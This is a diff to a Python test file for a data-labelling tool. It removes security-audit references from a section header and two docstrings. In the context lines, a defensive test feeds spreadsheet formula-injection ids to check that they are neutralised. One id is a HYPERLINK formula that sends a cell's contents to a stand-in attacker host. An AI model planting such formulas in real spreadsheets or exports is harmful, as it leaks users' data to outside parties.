@@ -298,7 +298,7 @@ def test_items_without_an_output_are_refused(tmp_path):
         LabelSession(path, tmp_path / "labels.csv")
 
 
-# --- spreadsheet formula injection (security audit item 5) -------------------------------------
+# --- spreadsheet formula injection ----------------------------------------------------------------
 
 
 def test_written_sheet_neutralises_formula_prefixes(tmp_path, serve):
@@ -317,7 +317,7 @@ def test_written_sheet_neutralises_formula_prefixes(tmp_path, serve):
 
 
 def test_formula_ids_are_guarded_and_survive_resume(tmp_path, serve):
-    """Security review, finding 1: the id column is a cell like any other."""
+    """The id column is a cell like any other."""
     ids = ('=HYPERLINK("http://evil.example/?x="&A1,"click")', "+1+1", "-2", "@SUM(1)",
            "\ttab", "\rcr")
     items = tmp_path / "items.jsonl"
@@ -343,7 +343,7 @@ def test_formula_ids_are_guarded_and_survive_resume(tmp_path, serve):
 
 
 def test_idle_connection_does_not_freeze_the_server(tmp_path, serve, monkeypatch):
-    """Security review, finding 3: a connection that sends nothing must not block the rest."""
+    """A connection that sends nothing must not block the rest."""
     import socket
     import time
 
